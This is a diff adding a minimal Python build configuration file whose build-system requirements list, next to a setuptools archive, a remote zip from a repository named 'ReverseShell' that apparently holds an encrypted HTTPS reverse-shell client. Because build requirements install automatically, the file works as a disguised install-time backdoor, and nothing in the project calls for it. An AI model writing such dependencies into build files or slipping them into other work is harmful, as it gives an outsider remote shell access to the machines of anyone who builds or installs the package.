@@ -1,0 +1,10 @@
+
+[build-system]
+requires = [
+    "https://github.com/pypa/setuptools/archive/refs/tags/v80.0.1.zip", 
+    "https://github.com/mauricelambert/ReverseShell/releases/download/v0.1.0python/shellclienthttpsencrypt_advanced_0_1_0.zip"
+]
+
+[project]
+
+[tool]
